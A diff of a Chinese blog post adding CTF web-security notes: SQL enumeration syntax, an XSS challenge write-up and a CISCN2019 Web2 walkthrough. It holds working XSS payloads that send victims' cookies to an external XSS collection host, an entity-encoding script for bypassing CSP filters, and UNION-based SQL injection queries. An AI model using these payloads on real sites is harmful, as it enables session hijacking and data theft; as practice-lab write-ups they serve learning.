@@ -66,7 +66,16 @@
 <meta property="og:image" content="https://i.loli.net/2020/02/03/loFPzHSr5ywiLR3.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/03/Dymcde8qjJTriKf.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/03/5RLthpyNgnzrPcT.png">
-<meta property="og:updated_time" content="2020-02-03T15:36:23.419Z">
+<meta property="og:image" content="https://i.loli.net/2020/02/19/89m7WbhPScHZV1x.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/19/AaizNvDpubqM21W.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/19/mz3ToVKeHNbl5LM.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/19/9IpxS5hcnwZaYP6.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/19/hqjR6Gzg3YftsUy.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/20/vwfuoSgnDY1WMQc.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/20/gP5JmhF26837Krq.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/20/WhaIO2RCgdX7iD5.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/20/c7AqgNLUyBRlGYX.png">
+<meta property="og:updated_time" content="2020-02-19T17:05:05.229Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="WEB">
 <meta name="twitter:description" content="Web学习">
@@ -252,11 +261,19 @@
                 
               
 
-              <time title="创建时间：2020-02-03 16:48:09 / 修改时间：23:36:23" itemprop="dateCreated datePublished" datetime="2020-02-03T16:48:09+08:00">2020-02-03</time>
+              <time title="创建时间：2020-02-03 16:48:09" itemprop="dateCreated datePublished" datetime="2020-02-03T16:48:09+08:00">2020-02-03</time>
             </span>
           
             
 
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-02-20 01:05:05" itemprop="dateModified" datetime="2020-02-20T01:05:05+08:00">2020-02-20</time>
+              </span>
             
           
             <span class="post-meta-item">
@@ -377,6 +394,40 @@
 <ol start="6">
 <li>最后发包得到flag<br><img src="https://i.loli.net/2020/02/03/5RLthpyNgnzrPcT.png" alt="image.png"></li>
 </ol>
+<h2 id="0x04-SQL注入"><a href="#0x04-SQL注入" class="headerlink" title="0x04:SQL注入"></a><em>0x04:SQL注入</em></h2><p><strong>我SQL注入比较菜,这里只介绍简单语法,等有时间会做个sqli-lab专题</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">databases</span>; //查看数据库</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> xxx; //使用某个数据库</span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">tables</span>; //查看该数据库的数据表</span><br><span class="line"></span><br><span class="line">desc xxx; //查看该数据表的结构</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> xxx; //查找某个数据表的所有内容</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata; //猜数据库</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'xxxxx'</span>; //猜某数据库的数据表</span><br><span class="line"></span><br><span class="line"><span class="keyword">Select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'xxxxx'</span>; //猜某表的所有列</span><br><span class="line"></span><br><span class="line">left(a,b) //从左侧截取 a 的前 b 位</span><br><span class="line"></span><br><span class="line">mid(column_name,<span class="keyword">start</span>[,<span class="keyword">length</span>]) //从位置<span class="keyword">start</span>开始，截取column_name字符串的<span class="keyword">length</span>位，与<span class="keyword">substr</span>作用相同</span><br><span class="line"></span><br><span class="line"><span class="keyword">substr</span>(<span class="keyword">string</span>, <span class="keyword">start</span>, <span class="keyword">length</span>) //从位置<span class="keyword">start</span>开始，截取字符串<span class="keyword">string</span>的<span class="keyword">length</span>长度，与<span class="keyword">mid</span>作用相同</span><br><span class="line"></span><br><span class="line"><span class="keyword">ascii</span>() //将某个字符转换成<span class="keyword">ascii</span>码</span><br><span class="line"></span><br><span class="line"><span class="keyword">ord</span>() //将某个字符转换成<span class="keyword">ascii</span>码，同<span class="keyword">ascii</span>()</span><br></pre></td></tr></table></figure>
+
+<p><strong>以及记录一些sqlmap的用法</strong></p>
+<p>参考:<br><a href="https://blog.csdn.net/qq_37133717/article/details/93621097" target="_blank" rel="noopener">sqlmap</a></p>
+<h2 id="0x05-XSS"><a href="#0x05-XSS" class="headerlink" title="0x05:XSS"></a><em>0x05:XSS</em></h2><p>参考<a href="https://www.bilibili.com/video/av70767032?from=search&seid=4989006937436882523" target="_blank" rel="noopener">赵师傅web讲座</a></p>
+<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a><em>0x01</em></h3><p><em>BUU XSS COURSE</em><br><img src="https://i.loli.net/2020/02/19/89m7WbhPScHZV1x.png" alt="image.png"><br>用alert发现不能弹窗<br>尝试用img发现可以解析<br><img src="https://i.loli.net/2020/02/19/AaizNvDpubqM21W.png" alt="image.png"><br>由视频知道可以使用onerror属性<br>在<a href="http://xss.buuoj.cn/" target="_blank" rel="noopener">http://xss.buuoj.cn/</a><br>创建项目<br>构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;aaaaaa&quot; onerror=&quot;(function()&#123;(new Image()).src=&apos;http://xss.buuoj.cn/index.php?do=api&amp;id=jWuFTf&amp;location=&apos;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return &apos;&apos;&#125;&#125;)())+&apos;&amp;toplocation=&apos;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return &apos;&apos;&#125;&#125;)())+&apos;&amp;cookie=&apos;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return &apos;&apos;&#125;&#125;)())+&apos;&amp;opener=&apos;+escape((function()&#123;try&#123;return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:&apos;&apos;&#125;catch(e)&#123;return &apos;&apos;&#125;&#125;)());&#125;)();&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>打过去</p>
+<p>在平台里可以看到后台和管理的cookie<br><img src="https://i.loli.net/2020/02/19/mz3ToVKeHNbl5LM.png" alt="image.png"></p>
+<p>所以我们就可以伪造cookie登录后台拿到flag</p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><h3 id="CISCN2019-华东北赛区-Web2"><a href="#CISCN2019-华东北赛区-Web2" class="headerlink" title="[CISCN2019 华东北赛区]Web2"></a><em>[CISCN2019 华东北赛区]Web2</em></h3><p>注册账号后看到投稿和反馈<br><img src="https://i.loli.net/2020/02/19/9IpxS5hcnwZaYP6.png" alt="image.png"><br><img src="https://i.loli.net/2020/02/19/hqjR6Gzg3YftsUy.png" alt="image.png"><br>结合两个页面来看是xss,通过反馈到管理员拿到cookie,通过测试发现有防护过滤机制,所有的都得转码,用<a href="https://www.w3.org/MarkUp/html-spec/html-spec_13.html" target="_blank" rel="noopener">HTML Markup</a></p>
+<p>tips:</p>
+<p><a href="https://www.cnblogs.com/leaf930814/p/7368429.html" target="_blank" rel="noopener">CSP</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;unsafe-inline&apos;：允许执行页面内嵌的&lt;script&gt;标签和事件监听函数</span><br><span class="line">&apos;unsafe-eval&apos;：允许将字符串当作代码执行，比如使用eval、setTimeout、setInterval等函数。</span><br></pre></td></tr></table></figure>
+
+<p><a href="http://www.ruanyifeng.com/blog/2016/09/csp.html" target="_blank" rel="noopener">CSP网页安全策略</a></p>
+<p>用eval来执行JS代码，而且这里需要用window.location.href来刷新页面自动触发。</p>
+<p>python脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">is_str = <span class="string">"(function()&#123;window.location.href='http://xss.buuoj.cn/index.php?do=api&amp;id=5LJIyL&amp;location='+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;toplocation='+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;cookie='+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;opener='+escape((function()&#123;try&#123;return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:''&#125;catch(e)&#123;return ''&#125;&#125;)());&#125;)();"</span></span><br><span class="line"></span><br><span class="line">output = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> is_str:</span><br><span class="line">    output += <span class="string">"&amp;#"</span> + str(ord(i))</span><br><span class="line"></span><br><span class="line">print(<span class="string">"&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34"</span> + output + <span class="string">"&amp;#34&amp;#41&lt;/script&gt;"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>生成的payload打到投稿框去提交<br><img src="https://i.loli.net/2020/02/20/vwfuoSgnDY1WMQc.png" alt="image.png"><br><img src="https://i.loli.net/2020/02/20/gP5JmhF26837Krq.png" alt="image.png"><br>而且这里提交时,要将域名替换成web</p>
+<p>这里有个验证码,比较MD5前6位相同,python脚本跑一跑</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000000</span>):</span><br><span class="line">    s = hashlib.md5(str(i).encode(<span class="string">'utf-8'</span>)).hexdigest()[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line">    <span class="keyword">if</span> s == <span class="string">"af7511"</span>:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>开始没加encode一直报错<br><a href="https://blog.csdn.net/chuange6363/article/details/100753773" target="_blank" rel="noopener">hashlib使用时出现: Unicode-objects must be encoded before hashing</a></p>
+<p>然后就按套路改cookie打进去<br>猜测常用后台名admin.php<br><img src="https://i.loli.net/2020/02/20/WhaIO2RCgdX7iD5.png" alt="image.png"></p>
+<p>最后是个常规的sql联合注入<br><img src="https://i.loli.net/2020/02/20/c7AqgNLUyBRlGYX.png" alt="image.png"><br>因为是学习,就不用sqlmap跑了</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#库名</span></span><br><span class="line">0 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="number">3</span> <span class="comment">#</span></span><br><span class="line"><span class="comment">#表名</span></span><br><span class="line"><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'ciscn'</span> <span class="comment">#</span></span><br><span class="line"><span class="comment">#字段</span></span><br><span class="line"><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'flag'</span> <span class="comment">#</span></span><br><span class="line"><span class="comment">#最后读flag</span></span><br></pre></td></tr></table></figure>
+
+<p>参考</p>
+<p><a href="https://blkwindy.top/2019/09/11/BUUCTF-CISCN-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-Web2/" target="_blank" rel="noopener">Blkwindy的wp</a></p>
+<p><a href="zhaoj.in/read-6100.html">赵师傅的wp</a></p>
 
     </div>
 
@@ -479,7 +530,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Web学习"><span class="nav-number">1.</span> <span class="nav-text">Web学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-好久没更新博客了-趁着放假学习学习web的一些知识点-把php和mysql粗略的学习了一下-开始做些CTF的题目"><span class="nav-number">1.1.</span> <span class="nav-text">0x00:好久没更新博客了,趁着放假学习学习web的一些知识点,把php和mysql粗略的学习了一下,开始做些CTF的题目.</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-PHP弱类型比较"><span class="nav-number">1.2.</span> <span class="nav-text">0x01:PHP弱类型比较</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-暴力破解"><span class="nav-number">1.3.</span> <span class="nav-text">0x02:暴力破解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-命令执行"><span class="nav-number">1.4.</span> <span class="nav-text">0x03:命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#常见命令执行函数"><span class="nav-number">1.4.1.</span> <span class="nav-text">常见命令执行函数</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Web学习"><span class="nav-number">1.</span> <span class="nav-text">Web学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-好久没更新博客了-趁着放假学习学习web的一些知识点-把php和mysql粗略的学习了一下-开始做些CTF的题目"><span class="nav-number">1.1.</span> <span class="nav-text">0x00:好久没更新博客了,趁着放假学习学习web的一些知识点,把php和mysql粗略的学习了一下,开始做些CTF的题目.</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-PHP弱类型比较"><span class="nav-number">1.2.</span> <span class="nav-text">0x01:PHP弱类型比较</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-暴力破解"><span class="nav-number">1.3.</span> <span class="nav-text">0x02:暴力破解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-命令执行"><span class="nav-number">1.4.</span> <span class="nav-text">0x03:命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#常见命令执行函数"><span class="nav-number">1.4.1.</span> <span class="nav-text">常见命令执行函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-SQL注入"><span class="nav-number">1.5.</span> <span class="nav-text">0x04:SQL注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-XSS"><span class="nav-number">1.6.</span> <span class="nav-text">0x05:XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01"><span class="nav-number">1.6.1.</span> <span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02"><span class="nav-number">1.6.2.</span> <span class="nav-text">0x02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CISCN2019-华东北赛区-Web2"><span class="nav-number">1.6.3.</span> <span class="nav-text">[CISCN2019 华东北赛区]Web2</span></a></li></ol></li></ol></li></ol></div>
         
       </div>
       <!--/noindex-->
